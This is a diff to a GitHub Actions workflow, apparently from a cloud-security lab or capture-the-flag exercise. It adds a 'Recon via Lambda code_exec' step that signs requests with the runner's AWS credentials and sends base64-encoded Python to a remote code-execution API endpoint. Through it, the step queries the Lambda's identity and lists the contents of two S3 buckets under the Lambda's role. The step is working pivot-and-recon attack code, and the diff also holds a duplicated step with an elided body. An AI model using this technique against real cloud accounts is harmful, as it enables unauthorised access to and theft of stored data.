@@ -18,9 +18,52 @@ jobs:
       - name: Who am I
         run: aws sts get-caller-identity
 
-      - name: Look at the two buckets directly
+      - name: Recon via Lambda code_exec
         run: |
-          for b in userad88e2b168aa387e logad88e2b168aa387e; do
-            echo "===== $b ====="
-            aws s3 ls "s3://$b/" --recursive 2>&1 | head -50
-          done
+          pip install requests --quiet
+          python3 << 'PYEOF'
+          ...
+          PYEOF
+          
+      - name: Recon via Lambda code_exec
+        run: |
+          python3 << 'PYEOF'
+          import boto3, json, base64, requests
+          from botocore.auth import SigV4Auth
+          from botocore.awsrequest import AWSRequest
+
+          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
+
+          def run_code(python_code):
+              session = boto3.Session()
+              creds = session.get_credentials().get_frozen_credentials()
+              payload = json.dumps({"code": base64.b64encode(python_code.encode()).decode()})
+              req = AWSRequest(method='POST', url=API, data=payload, headers={'Content-Type': 'application/json'})
+              SigV4Auth(creds, 'execute-api', 'us-east-1').add_auth(req)
+              r = requests.post(API, data=payload, headers=dict(req.headers))
+              print(r.text)
+
+          # מי ה-Lambda?
+          print("=== identity ===")
+          run_code("import boto3; print(boto3.client('sts').get_caller_identity())")
+
+          # מה יש בbuckets?
+          print("=== userad88e2b168aa387e ===")
+          run_code("""
+              import boto3
+              b = boto3.client('s3', region_name='us-east-1')
+              for obj in b.list_objects_v2(Bucket='userad88e2b168aa387e').get('Contents', []):
+                  print(obj['Key'], obj['Size'])
+              """)
+
+          print("=== logad88e2b168aa387e ===")
+          run_code("""
+              import boto3
+              b = boto3.client('s3', region_name='us-east-1')
+              for obj in b.list_objects_v2(Bucket='logad88e2b168aa387e').get('Contents', []):
+                  print(obj['Key'], obj['Size'])
+              """)
+          PYEOF
+
+      - name: Install requests
+        run: pip install requests --quiet
